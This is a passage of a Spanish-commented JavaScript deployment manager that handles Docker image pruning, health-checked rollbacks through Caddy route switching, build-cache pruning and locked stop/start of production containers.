    // Podar imágenes Docker antiguas del proyecto conservando las más recientes (`keep`) y las vivas
    /** @type {string[]} */
    const removedImages = [];
    const keepTags = new Set(aliveImages);
    const historyImgs = (state.history || []).map((h) => h.imageTag).filter(Boolean);
    for (const tag of historyImgs.slice(0, Math.max(2, Number(keep) || 2))) keepTags.add(tag);

    const imgList = await this.runDocker(
      ['images', '--filter', `label=com.culkibo.project=${safeSlug(projectId)}`, '--format', '{{.Repository}}:{{.Tag}}'],
      { timeoutMs: 10000 }
    );
    if (imgList.code === 0) {
      for (const tag of (imgList.stdout || '').split(/\r?\n/).map(s => s.trim()).filter(Boolean)) {
        if (!tag || tag.includes('<none>') || keepTags.has(tag)) continue;
        const rmi = await this.runDocker(['rmi', tag], { timeoutMs: 20000 });
        if (rmi.code === 0) removedImages.push(tag);
      }
    }

    return { removed, removedImages, keep };
  }

  /** @param {string} containerName @param {Set<string> | null} [protectedNames] */
  async forceRemove(containerName, protectedNames = null) {
    if (!containerName) return;
    if (protectedNames && protectedNames.has(containerName)) return;
    await this.runDocker(['rm', '-f', containerName], { timeoutMs: 20000 });
  }

  /** Vuelca las últimas líneas del contenedor al log del despliegue. */
  async captureContainerLogs(deployment, containerName, lines = 60) {
    const res = await this.runDocker(['logs', '--tail', String(lines), containerName], { timeoutMs: 10000 });
    const text = `${res.stdout || ''}${res.stderr || ''}`.trim();
    if (!text) return;
    this.log(deployment, 'ERROR', `Últimas líneas del contenedor:\n${text.slice(0, 3000)}`);
  }

  // -------------------------------------------------------------------------
  // 6. Rollback
  // -------------------------------------------------------------------------

  /**
   * Vuelve a la versión anterior.
   *
   * Dos caminos, y el rápido es el habitual:
   *
   *   - Si el contenedor anterior sigue en ejecución (todavía estamos dentro de
   *     su ventana de drenaje), el rollback es SOLO un cambio de ruta:
   *     milisegundos, sin arrancar nada.
   *   - Si ya está parado, se arranca, se espera a que esté sano y entonces se
   *     conmuta. Nunca al revés: mover la ruta a algo que aún no responde es
   *     cambiar una versión mala por un 502.
   *
   * En ningún caso se reconstruye la imagen: el rollback no puede depender de
   * que un build vuelva a salir bien.
   */
  async rollback(projectOrId, options = {}) {
    const projectId = (projectOrId && typeof projectOrId === 'object') ? projectOrId.id : projectOrId;
    if (!projectId || typeof projectId !== 'string') throw new Error('Proyecto inválido');
    if (this.locks.has(projectId)) {
      throw new Error('Ya hay una operación de despliegue o rollback en curso para este proyecto');
    }
    const task = this._rollback(projectId, options).finally(() => {
      if (this.locks.get(projectId) === task) this.locks.delete(projectId);
      this.drainPending(projectId);
    });
    this.locks.set(projectId, task);
    return task;
  }

  async _rollback(projectId, options = {}) {
    const opts = { ...DEFAULTS, ...options };
    const state = this.getState(projectId);
    if (!state.previous) {
      throw new Error('No hay ninguna versión anterior a la que volver');
    }

    const target = state.previous;
    const current = state.current;

    /** @type {any} */
    const record = {
      id: `rbk_${Date.now()}_${crypto.randomBytes(3).toString('hex')}`,
      projectId,
      projectName: (current && current.projectName) || projectId,
      status: 'promocionando',
      kind: 'rollback',
      imageTag: target.imageTag,
      containerName: target.containerName,
      hostPort: target.hostPort,
      containerPort: target.containerPort,
      upstream: target.upstream,
      hostnames: target.hostnames || [],
      routeSwitched: false,
      git: target.git || null,
      trigger: options.trigger || 'manual',
      previous: current ? { ...current } : null,
      startedAt: new Date().toISOString(),
      finishedAt: null,
      durationMs: null,
      error: null,
      logLines: []
    };
    state.history.unshift(record);
    if (state.history.length > 20) state.history.pop();

    const started = Date.now();
    /** @param {string} status @param {string | null} [error] */
    const finish = (status, error = null) => {
      record.finishedAt = new Date().toISOString();
      record.durationMs = Date.now() - started;
      record.error = error;
      this.setStatus(record, status);
      this.saveStore();
      return record;
    };

    try {
      const docker = await this.detectDocker({ force: true });
      if (!docker.available) return finish('fallido', docker.reason);

      const running = await this.runDocker(['inspect', '-f', '{{.State.Running}}', target.containerName], { timeoutMs: 8000 });
      if (running.code !== 0) {
        const msg = `El contenedor de la versión anterior (${target.containerName}) ya no existe; no se puede revertir sin reconstruir`;
        this.log(record, 'ERROR', msg);
        return finish('fallido', msg);
      }

      if ((running.stdout || '').trim() !== 'true') {
        this.log(record, 'INFO', `Arrancando la versión anterior ${target.containerName}...`);
        const start = await this.runDocker(['start', target.containerName], { timeoutMs: 30000 });
        if (start.code !== 0) {
          const msg = start.stderr.trim() || `docker start terminó con código ${start.code}`;
          this.log(record, 'ERROR', `No se pudo arrancar la versión anterior: ${msg}`);
          return finish('fallido', msg);
        }

        const health = await this.waitForHealth({
          hostPort: target.hostPort,
          healthPath: target.healthPath || DEFAULTS.healthPath,
          containerName: target.containerName,
          timeoutMs: opts.healthTimeoutMs,
          intervalMs: opts.healthIntervalMs,
          onProgress: (m) => this.log(record, 'INFO', m)
        });
        if (!health.healthy) {
          const msg = `La versión anterior tampoco pasó la verificación de salud: ${health.reason}`;
          this.log(record, 'ERROR', msg);
          return finish('fallido', msg);
        }
        this.log(record, 'SUCCESS', `Versión anterior sana (HTTP ${health.status})`);
      } else {
        this.log(record, 'INFO', 'La versión anterior sigue viva dentro de su ventana de drenaje: el rollback es solo un cambio de ruta');
      }

      const hostnames = (target.hostnames && target.hostnames.length) ? target.hostnames : record.hostnames;
      if (hostnames.length > 0) {
        const switched = await this.switchRoute(record, hostnames, target.upstream);
        if (!switched.ok) return finish('fallido', switched.error);
      } else {
        this.log(record, 'WARN', 'Sin dominios asignados: no hay ninguna ruta que conmutar');
      }

      // P0-3: cancelar drenaje previo antes de promocionar de nuevo `target`
      this.cancelDrain(projectId);
      // Se intercambian: la que estaba sirviendo pasa a ser «la anterior», así
      // que un segundo rollback vuelve hacia delante.
      target.status = 'activo';
      state.current = target;
      state.previous = current || null;
      this.saveStore();

      // El contenedor que acabamos de retirar también drena antes de pararse.
      if (current && current.containerName !== target.containerName) {
        const drain = this.drainAndRetire(record, current, opts)
          .catch(err => this.log(record, 'WARN', `Fallo al retirar ${current.containerName}: ${err.message}`))
          .finally(() => { if (this.drains.get(projectId) === drain) this.drains.delete(projectId); });
        this.drains.set(projectId, drain);
      }

      this.log(record, 'SUCCESS', `Rollback completado: sirviendo ${target.imageTag}`);
      this.notify({
        event: 'rollback',
        level: 'warning',
        title: 'Rollback ejecutado',
        message: `${record.projectName} ha vuelto a ${target.imageTag}.`,
        projectId,
        projectName: record.projectName
      });
      return finish('activo');
    } catch (err) {
      this.log(record, 'ERROR', `Error inesperado en el rollback: ${err.message}`);
      return finish('fallido', err.message);
    }
  }

  /** Espera al drenaje en curso. Lo usan las pruebas y el apagado ordenado. */
  async awaitDrain(projectId) {
    const drain = this.drains.get(projectId);
    if (drain) await drain;
  }

  // -------------------------------------------------------------------------
  // 7. Estado y mantenimiento
  // -------------------------------------------------------------------------

  async status(projectId) {
    const state = this.getState(projectId);
    const docker = await this.detectDocker();
    /** @type {any} */
    let containerState = null;
    if (docker.available && state.current) {
      const res = await this.runDocker(
        ['inspect', '-f', '{{.State.Status}}|{{if .State.Health}}{{.State.Health.Status}}{{else}}sin-healthcheck{{end}}', state.current.containerName],
        { timeoutMs: 8000 }
      );
      if (res.code === 0) {
        const [status, health] = (res.stdout || '').trim().split('|');
        containerState = { status, health };
      }
    }
    const last = state.history[0] || null;
    return {
      docker,
      current: state.current,
      previous: state.previous,
      canRollback: Boolean(state.previous),
      containerState,
      // Sin esto el panel no puede distinguir «no hay despliegue» de «hay uno
      // a medio construir», que es justo cuando el usuario mira la pantalla.
      inProgress: this.locks.has(projectId),
      queued: this.pending.has(projectId),
      lastDeployment: last ? { ...last, logLines: undefined, logLineCount: (last.logLines || []).length } : null
    };
  }

  /**
   * Poda de la caché de construcción de BuildKit.
   *
   * BuildKit tiene un recolector propio que `docker system prune` NO gobierna.
   * Sus valores por defecto, leídos del código de moby
   * (`daemon/internal/builder-next/worker/gc.go`) para el BuildKit embebido en
   * dockerd, que es el que usa un `docker build` normal:
   *
   *   - política 1 — `source.local`, `exec.cachemount`, `source.git.checkout`:
   *     KeepDuration = 48 h, MaxUsedSpace = max(10 % del disco x 13,8 %, 512 MB)
   *   - política 2 — todo lo demás: KeepDuration = 60 DÍAS (1440 h)
   *   - políticas 3 y 4: solo topes de espacio
   *   - topes por defecto: reservado 10 % del disco (mínimo 2 GB),
   *     máximo usado 80 %, libre mínimo 20 %
   *
   * Es decir: el famoso «48 h» existe, pero solo aplica a los tipos de caché
   * baratos de reproducir. La caché general se conserva 60 días. Y se configura
   * en `/etc/docker/daemon.json` bajo `builder.gc`, NO en
   * `/etc/buildkit/buildkitd.toml` — ese fichero solo afecta a un buildkitd
   * independiente (drivers `docker-container`, `remote`, `kubernetes`), y
   * confundirlos es escribir una política que no se aplica nunca.
   *
   * Qué debería hacer Culkibo con esto:
   *   1. NO podar automáticamente después de cada despliegue. Eso es
   *      destruirse la caché a mano y volver a los 4,5 minutos de build de
   *      Coolify por otra vía.
   *   2. Gobernar por ESPACIO, no por antigüedad: lo que tumba un VPS de 40 GB
   *      es el disco lleno, no una capa de hace tres semanas.
   *   3. Dejarlo en manos del operador —esta función— y poder programarlo.
   *   4. A medio plazo, escribir `builder.gc.policy` en daemon.json durante la
   *      instalación para que el tope por defecto no sea el 80 % del disco en
   *      una máquina que además aloja las aplicaciones. Pendiente.
   *
   * Nota de CLI: `docker builder prune` acepta `--keep-storage`. En
   * `docker buildx prune` ese flag está deprecado a favor de
   * `--reserved-space`. Aquí se usa el primero, que es el del CLI base.
   */
  async pruneBuildCache({ keepStorageGb = 10, untilHours = null } = {}) {
    const docker = await this.detectDocker();
    if (!docker.available) return { ok: false, error: docker.reason };

    const gb = Number(keepStorageGb);
    if (!Number.isFinite(gb) || gb < 0 || gb > 10000) {
      return { ok: false, error: 'keepStorageGb debe ser un número entre 0 y 10000' };
    }

    const args = ['builder', 'prune', '--force', '--keep-storage', `${Math.round(gb)}GB`];
    if (untilHours != null) {
      const hours = Number(untilHours);
      if (!Number.isFinite(hours) || hours <= 0 || hours > 8760) {
        return { ok: false, error: 'untilHours debe ser un número entre 1 y 8760' };
      }
      args.push('--filter', `until=${Math.round(hours)}h`);
    }

    const res = await this.runDocker(args, { timeoutMs: 120000 });
    return res.code === 0
      ? { ok: true, output: (res.stdout || '').trim().slice(0, 2000) }
      : { ok: false, error: (res.stderr || '').trim().slice(0, 600) };
  }

  /**
   * Reconstruye las rutas de Caddy a partir de lo que Culkibo cree que está
   * desplegado. Se llama al arrancar el daemon: si Caddy se reinició y perdió
   * su configuración, el estado real vuelve a converger con el modelo. Dokploy
   * tiene un fallo abierto justo por no hacer esto: tras un reinicio sucio los
   * adjuntos de red no se reaplican y el modelo y la realidad divergen en
   * silencio.
   *
   * ADITIVA a propósito, a diferencia de `caddyManager.reconcile()`: aquí solo
   * se reponen las rutas de nuestros despliegues, nunca se borra ninguna. Una
   * ruta que Culkibo no reconoce puede ser de un despliegue anterior a este
   * proceso o algo que el operador puso a mano; arrancar el daemon no es momento
   * de tirar tráfico ajeno. La poda destructiva sigue disponible, explícita, en
   * `caddyManager.reconcile()`.
   */
  async reconcileRoutes() {
    /** @type {any[]} */
    const specs = [];
    for (const [projectId, state] of Object.entries(this.store)) {
      if (
        state.current &&
        state.current.upstream &&
        state.current.status !== 'detenido' &&
        state.current.status !== 'stopped' &&
        (state.current.hostnames || []).length > 0
      ) {
        specs.push({ projectId, hostnames: state.current.hostnames, upstreams: [state.current.upstream] });
      }
    }
    if (specs.length === 0) return { applied: [], skipped: 'no hay despliegues con dominio' };

    const detection = await caddyManager.detect({ force: true });
    if (!detection.available) return { applied: [], skipped: detection.reason };

    /** @type {string[]} */
    const applied = [];
    /** @type {any[]} */
    const failed = [];
    for (const spec of specs) {
      try {
        const result = await caddyManager.upsertRoute(spec);
        applied.push(result.id);
      } catch (err) {
        failed.push({ projectId: spec.projectId, error: err.message });
      }
    }
    return { applied, failed };
  }

  /** Detiene el servicio de producción de un proyecto sin borrar nada (serializado por lock). */
  async stopProduction(projectOrId) {
    const projectId = (projectOrId && typeof projectOrId === 'object') ? projectOrId.id : projectOrId;
    if (!projectId || typeof projectId !== 'string') throw new Error('Proyecto inválido');
    if (this.locks.has(projectId)) {
      throw new Error('Hay un despliegue en curso para este proyecto; espera a que termine antes de detenerlo');
    }
    const task = (async () => {
      this.cancelDrain(projectId);
      const state = this.getState(projectId);
      if (!state.current) return { stopped: false, reason: 'Este proyecto no tiene ningún despliegue activo' };
      try { await caddyManager.removeRoute(projectId); } catch (e) {}
      const res = await this.runDocker(['stop', '--time', String(DEFAULTS.stopGraceSeconds), state.current.containerName], { timeoutMs: 40000 });
      if (res.code === 0) {
        // P1-7: marcar estado detenido para que reconcileRoutes() / ingressManager no re-publiquen 502s
        state.current.status = 'detenido';
        this.saveStore();
      }
      return { stopped: res.code === 0, containerName: state.current.containerName, error: res.code === 0 ? null : res.stderr.trim() };
    })().finally(() => {
      if (this.locks.get(projectId) === task) this.locks.delete(projectId);
      this.drainPending(projectId);
    });
    this.locks.set(projectId, task);
    return task;
  }

  /**
   * Vuelve a levantar el servicio que `stopProduction()` paró (serializado por lock).
   */
  async startProduction(projectOrId, options = {}) {
    const projectId = (projectOrId && typeof projectOrId === 'object') ? projectOrId.id : projectOrId;
    if (!projectId || typeof projectId !== 'string') throw new Error('Proyecto inválido');
    if (this.locks.has(projectId)) {
      throw new Error('Hay un despliegue en curso para este proyecto; espera a que termine antes de arrancarlo');
    }
    const task = (async () => {
      const opts = { ...DEFAULTS, ...options };
      const state = this.getState(projectId);
      if (!state.current) return { started: false, reason: 'Este proyecto no tiene ningún despliegue activo' };

      const docker = await this.detectDocker({ force: true });
      if (!docker.available) return { started: false, reason: docker.reason };

      const target = state.current;
      const start = await this.runDocker(['start', target.containerName], { timeoutMs: 40000 });
      if (start.code !== 0) {
        return {
          started: false,
          containerName: target.containerName,
          error: (start.stderr || '').trim() || `docker start terminó con código ${start.code}`
        };
      }

      const health = await this.waitForHealth({
        hostPort: target.hostPort,
        healthPath: target.healthPath || DEFAULTS.healthPath,
        containerName: target.containerName,
        timeoutMs: opts.healthTimeoutMs,
        intervalMs: opts.healthIntervalMs,
        onProgress: null
      });
      if (!health.healthy) {
        return {
          started: false,
          containerName: target.containerName,
          error: `El contenedor arrancó pero no pasó la verificación de salud: ${health.reason}`
        };
      }

      if ((target.hostnames || []).length > 0 && target.upstream) {
        try {
          await caddyManager.upsertRoute({
            projectId,
            hostnames: target.hostnames,
            upstreams: [target.upstream]
          });
        } catch (err) {
          return {
            started: true,
            routeRestored: false,
            containerName: target.containerName,
            error: `El servicio está arriba, pero no se pudo reponer la ruta: ${err.message}`
          };
        }
      }

      target.status = 'activo';
      this.saveStore();
      return { started: true, routeRestored: true, containerName: target.containerName, error: null };
    })().finally(() => {
      if (this.locks.get(projectId) === task) this.locks.delete(projectId);
      this.drainPending(projectId);
    });
    this.locks.set(projectId, task);
    return task;
  }
}

// La instancia es el export principal; la clase y los ayudantes cuelgan de
// ella para que las pruebas puedan crear instancias aisladas sin disco.
const instance = /** @type {any} */ (new DeployManager());
instance.DeployManager = DeployManager;
instance.DEFAULTS = DEFAULTS;
instance.helpers = { safeSlug, isValidEnvName, sanitizeHealthPath, sanitizeNodeMajor, sanitizePort, filterSafeHostEnv };

module.exports = instance;
